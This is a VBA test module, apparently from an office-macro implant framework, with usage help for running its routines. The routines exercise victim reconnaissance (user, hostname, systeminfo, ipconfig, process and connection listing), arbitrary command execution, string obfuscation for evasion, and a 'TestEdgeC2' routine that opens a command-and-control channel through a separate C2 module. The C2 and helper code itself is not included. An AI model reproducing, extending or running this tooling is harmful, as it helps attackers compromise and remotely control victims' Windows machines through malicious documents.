Attribute VB_Name = "TestModule"
' =============================================================================
' Test Module - For simple testing of VBA functions
' =============================================================================
' This module provides simple test functions for easy testing of all features
' =============================================================================

Option Explicit

' =============================================================================
' 主要測試函數
' =============================================================================

Public Sub TestAllFunctions()
    ' Test all main functions
    Debug.Print "=== Starting All Function Tests ===" & vbCrLf
    
    ' Test system information collection
    TestSystemInfo
    
    ' Test command execution
    TestCommandExecution
    
    ' Test file operations
    TestFileOperations
    
    ' Test obfuscation techniques
    TestObfuscation
    
    ' Test network functions
    TestNetworkFunctions
    
    Debug.Print vbCrLf & "=== All Tests Completed ==="
End Sub

Public Sub TestSystemInfo()
    ' Test system information collection
    Debug.Print "1. System Information Test:"
    
    Dim sysInfo As String
    sysInfo = GetFullSystemInfo()
    Debug.Print sysInfo
    
    Debug.Print "Current User: " & GetCurrentUserName()
    Debug.Print "Computer Name: " & GetCurrentComputerName()
    Debug.Print "Processor Architecture: " & Environ("PROCESSOR_ARCHITECTURE")
    
    Debug.Print "✓ System Info Test Completed" & vbCrLf
End Sub

Public Sub TestCommandExecution()
    ' Test command execution functionality
    Debug.Print "2. Command Execution Test:"
    
    ' Test simple command
    Dim result As String
    result = ExecuteCommand("echo Hello World")
    Debug.Print "Command Output: " & result
    
    ' Test system info command
    result = ExecuteCommand("systeminfo | findstr /B /C:\"\"OS Name\"\" /C:\"\"Total Physical Memory\"\"")
    Debug.Print "System Info: " & result
    
    ' Test network command
    result = ExecuteCommand("ipconfig | findstr IPv4")
    Debug.Print "IP Address: " & result
    
    Debug.Print "✓ Command Execution Test Completed" & vbCrLf
End Sub

Public Sub TestFileOperations()
    ' Test file operations functionality
    Debug.Print "3. File Operations Test:"
    
    Dim testFilePath As String
    testFilePath = Environ("TEMP") & "\test_file.txt"
    
    ' Write test file
    WriteToFile testFilePath, "This is test file content - Created: " & Now()
    Debug.Print "File written: " & testFilePath
    
    ' Check if file exists
    If FileExists(testFilePath) Then
        Debug.Print "File existence verification: Success"
        
        ' Read file content
        Dim fileContent As String
        fileContent = ReadFileContents(testFilePath)
        Debug.Print "File content: " & fileContent
    Else
        Debug.Print "File existence verification: Failed"
    End If
    
    Debug.Print "✓ File Operations Test Completed" & vbCrLf
End Sub

Public Sub TestObfuscation()
    ' Test obfuscation techniques
    Debug.Print "4. Obfuscation Techniques Test:"
    
    Dim originalText As String
    originalText = "This is secret text that needs obfuscation"
    
    ' Test string obfuscation
    Dim obfuscatedText As String
    obfuscatedText = ObfuscateString(originalText)
    Debug.Print "Original Text: " & originalText
    Debug.Print "Obfuscated: " & obfuscatedText
    
    ' Test deobfuscation
    Dim deobfuscatedText As String
    deobfuscatedText = DeobfuscateString(obfuscatedText)
    Debug.Print "Deobfuscated: " & deobfuscatedText
    
    ' Verify results
    If deobfuscatedText = originalText Then
        Debug.Print "✓ Obfuscation/Deobfuscation Verification: Success"
    Else
        Debug.Print "✗ Obfuscation/Deobfuscation Verification: Failed"
    End If
    
    Debug.Print "✓ Obfuscation Techniques Test Completed" & vbCrLf
End Sub

Public Sub TestNetworkFunctions()
    ' Test network-related functions
    Debug.Print "5. Network Functions Test:"
    
    ' Test process list
    Dim processes As String
    processes = GetRunningProcesses()
    Debug.Print "Running processes count: " & Len(processes) & " characters"
    
    ' Test network connections
    Dim connections As String
    connections = GetNetworkConnections()
    Debug.Print "Network connections info length: " & Len(connections) & " characters"
    
    ' Show partial information
    If Len(processes) > 100 Then
        Debug.Print "Process list example: " & Left(processes, 100) & "..."
    End If
    
    Debug.Print "✓ Network Functions Test Completed" & vbCrLf
End Sub

' =============================================================================
' Simple Test Functions
' =============================================================================

Public Sub SimpleTest()
    ' Simple test - suitable for quick verification
    Debug.Print "=== Simple Test Started ==="
    
    ' Test system information
    Debug.Print "User: " & Environ("USERNAME")
    Debug.Print "Computer: " & Environ("COMPUTERNAME")
    
    ' Test simple commands
    Dim result As String
    result = ExecuteCommand("whoami")
    Debug.Print "Current User: " & result
    
    result = ExecuteCommand("hostname")
    Debug.Print "Hostname: " & result
    
    Debug.Print "=== Simple Test Completed ==="
End Sub

Public Sub TestEdgeC2()
    ' Test Edge C2 functionality
    Debug.Print "=== Testing Edge C2 Functionality ==="
    
    ' Initialize C2 connection
    C2MainModule.InitializeC2Connection
    
    ' Establish Edge C2 channel
    C2MainModule.EstablishEdgeC2
    
    Debug.Print "✓ Edge C2 Test Completed"
End Sub

' =============================================================================
' Step-by-Step Test Functions
' =============================================================================

Public Sub StepByStepTest()
    ' Step-by-step testing guide
    Debug.Print "Welcome to VBA Testing Framework!"
    Debug.Print "Please select function to test:"
    Debug.Print "1. Run SimpleTest() - Basic functionality test"
    Debug.Print "2. Run TestAllFunctions() - Complete test"
    Debug.Print "3. Run TestEdgeC2() - C2 functionality test"
    Debug.Print "4. Run individual test functions"
    Debug.Print ""
    Debug.Print "Usage: Type 'SimpleTest' in Immediate Window and press Enter"
End Sub

' =============================================================================
' Help Functions
' =============================================================================

Public Sub ShowHelp()
    ' Display help information
    Debug.Print "=== VBA Testing Framework Help ==="
    Debug.Print ""
    Debug.Print "Available Test Functions:"
    Debug.Print "- SimpleTest()        - Basic functionality test"
    Debug.Print "- TestAllFunctions()  - Complete functionality test"
    Debug.Print "- TestSystemInfo()    - System information test"
    Debug.Print "- TestCommandExecution() - Command execution test"
    Debug.Print "- TestFileOperations() - File operations test"
    Debug.Print "- TestObfuscation()   - Obfuscation techniques test"
    Debug.Print "- TestNetworkFunctions() - Network functions test"
    Debug.Print "- TestEdgeC2()        - C2 functionality test"
    Debug.Print ""
    Debug.Print "Usage:"
    Debug.Print "1. In VBA Editor press Ctrl+G to open Immediate Window"
    Debug.Print "2. Type test function name, e.g.: SimpleTest"
    Debug.Print "3. Press Enter to execute"
    Debug.Print "4. View output results in Immediate Window"
    Debug.Print ""
    Debug.Print "Note: Please ensure all .bas files have been imported"
End Sub
